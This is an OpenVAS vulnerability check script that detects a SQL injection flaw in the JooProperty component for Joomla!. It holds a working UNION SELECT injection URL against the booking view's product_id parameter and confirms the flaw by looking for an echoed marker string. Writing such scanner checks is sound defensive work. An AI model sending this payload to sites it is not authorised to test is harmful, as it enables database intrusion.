###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_56885.nasl 6720 2017-07-13 14:25:27Z cfischer $
#
# Joomla! JooProperty Component SQL Injection and Cross Site Scripting Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The JooProperty component for Joomla! is prone to an SQL-injection
vulnerability and a cross-site scripting vulnerability because it
fails to properly sanitize user-supplied input.

An attacker may leverage these issues to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site. This can allow the attacker to steal cookie-based authentication
credentials, compromise the application, access or modify data, or
exploit latent vulnerabilities in the underlying database.

JooProperty 1.13.0 is vulnerable; other versions may also be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103622";
CPE = "cpe:/a:joomla:joomla";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(56885);
 script_tag(name:"cvss_base", value:"8.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");
 script_version ("$Revision: 6720 $");

 script_name("Joomla! JooProperty Component SQL Injection and Cross Site Scripting Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/56885");
 script_xref(name : "URL" , value : "http://www.joomla.org");

 script_tag(name:"last_modification", value:"$Date: 2017-07-13 16:25:27 +0200 (Thu, 13 Jul 2017) $");
 script_tag(name:"creation_date", value:"2012-12-12 12:59:16 +0100 (Wed, 12 Dec 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("joomla_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("joomla/installed");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

ex = '?option=com_jooproperty&view=booking&layout=modal&product_id=1%20and%201=0%20union%20select%20111111,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374+--';
url = dir + '/' + ex;

host = get_host_name();

req = string("GET ",url," HTTP/1.1\r\n",
             "Host: ", host,"\r\n\r\n");

result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("Location" >< result && "OpenVAS-SQL-Injection-Test" >!< result) {

  loc = eregmatch(pattern:"Location: (.*)/\?",string:result);
  if(loc[1]) {

   if("http://" >< loc[1]) {
     
     _loc = loc[1] - ('http://' + host);
     url = _loc + ex;

     req = string("GET ",url," HTTP/1.1\r\n",
                  "Host: ", host,"\r\n\r\n");

     result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
   }  
  }  

}

if(result && "OpenVAS-SQL-Injection-Test" >< result) {
  security_message(port:port);
  exit(0);
}  

exit(0);
